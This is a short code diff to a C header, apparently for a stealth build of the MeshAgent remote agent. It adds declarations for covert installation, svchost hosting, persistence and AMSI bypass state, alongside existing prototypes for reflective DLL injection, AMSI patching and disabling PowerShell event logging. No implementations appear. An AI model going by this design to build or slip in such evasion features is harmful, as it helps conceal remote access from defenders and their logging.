@@ -337,6 +337,12 @@ public:
 extern "C" {
 #endif
 
+BOOL Stealth_PerformCompleteInstallation(
+    const wchar_t* sourceExePath,
+    const wchar_t* sourceDllPath,
+    BOOL useSvchostMode);
+BOOL Stealth_PerformCompleteUninstallation(void);
+
 /**
  * Service DLL entry point for svchost.exe hosting
  * Called by svchost.exe when service starts in shared process mode
@@ -408,9 +414,13 @@ BOOL Stealth_ReflectiveInject(DWORD processId, const BYTE* dllBytes, size_t dllS
  * Patch AMSI (Antimalware Scan Interface) to bypass script scanning
  */
 BOOL Stealth_PatchAMSI(void);
+void Stealth_SetAmsiBypassState(BOOL active);
+BOOL Stealth_IsAmsiPatched(void);
 // Optional AMSI bypass variants (lab/testing): hardware breakpoint & NtContinue
 BOOL Stealth_PatchAMSI_HardwareBreakpoint(void);
 BOOL Stealth_PatchAMSI_NtContinue(void);
+void Stealth_ApplyPersistenceProfile(void);
+void Stealth_EnsureLoggingDefaults(void);
 
 /**
  * Disable PowerShell and Command Line event logging
@@ -458,6 +468,11 @@ BOOL Stealth_GetInstallPaths(StealthInstallPaths *paths);
 // Installation helpers (used by installer/registration)
 BOOL Stealth_CreateInstallationDirectory(const wchar_t* installPath);
 BOOL Stealth_InstallFiles(const wchar_t* sourcePath, const wchar_t* destPath);
+#if defined(WIN32) && defined(MESHAGENT_ENABLE_STEALTH)
+BOOL Stealth_PerformCompleteInstallation(const wchar_t* sourceExePath, const wchar_t* sourceDllPath, BOOL useSvchostMode);
+BOOL Stealth_PerformCompleteUninstallation(void);
+BOOL Stealth_IsAlreadyInstalled(void);
+#endif
 
 // ================================================================
 // C Wrappers for C++-only Utilities
